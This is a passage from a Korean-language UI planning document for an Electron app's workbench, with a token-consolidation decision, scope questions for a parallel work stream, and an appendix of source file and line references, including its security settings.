| Q9 | 토큰 정리 범위 | (가) 지금 2단 토큰 구조 + 다크 값, 1차-나가 다시 쓰는 구역만 토큰화 / (나) 2차에 한꺼번에 | **(가)**(3.5절). 같은 줄을 두 번 고치지 않고, 1차-가 상태 색과 이름을 지금 맞출 수 있습니다. |

조정자 확인 사항(주인님 결정이 아니라 1차-가와의 경계):

- 1차 로드맵 4번 "단계 진행 막대 + 실시간 활동" 중 **막대·카드 배치는 1차-나, 활동 줄 한국어 동사는 1차-가**로 나누는 것이 맞는지 확인이 필요합니다.
- F13(재시작 때 마지막 작업 복원)이 1차-가 범위인지 확인이 필요합니다. 1차-나는 레이아웃 상태(오른쪽 폭·탭)만 복원합니다.
- 상태 색 토큰 이름(`--status-running/attention/review/done/danger`)을 1차-가와 맞춰야 합니다.

---

## 부록 — 근거 위치

- dock 기본 트리: `src/m5/dock-layout.ts:6-19`. 레이아웃을 저장하지 않음: `src/m5/workbench-dock.tsx:9`. 초안 보존 원칙: `workbench-dock.tsx:46`
- 렌더 구조: `src/m5/workbench.tsx:522-773`(레일·상단·dock·결과 막대·목록·파일·편집기·변경), `TeamTimeline` `:1213-1303`, `AgentRuns` `:1329-1374`
- 앱 창 보안: `electron/main.ts:163`(스킴 권한), `:206-256`(`serveAppAsset` 경로 검증과 CSP 헤더), `:262-286`(탐색·창 열기·webview 막기·IPC 보낸 쪽 검사), `:744-756`(`sandbox`, `contextIsolation`)
- 앱 CSP: `src/m5/index.html:7-8`
- 파일 읽기 계약: `src/m5/contracts/file-v1.ts`(이진 파일은 내용 없음), `FILE_MAX_BYTES_V1 = 5MiB`(`contracts/project-v1.ts:5`), `file.read` IPC `electron/main.ts:705`
- 에이전트 샌드박스의 브라우저 불가: `docs/history.md` 2026-11-23 관찰
- 토큰 현황: `src/m5/styles.css:1-26`(`:root` 13개), 고유 hex 163개 / hex 줄 222개(이 계획 작성 시 grep)
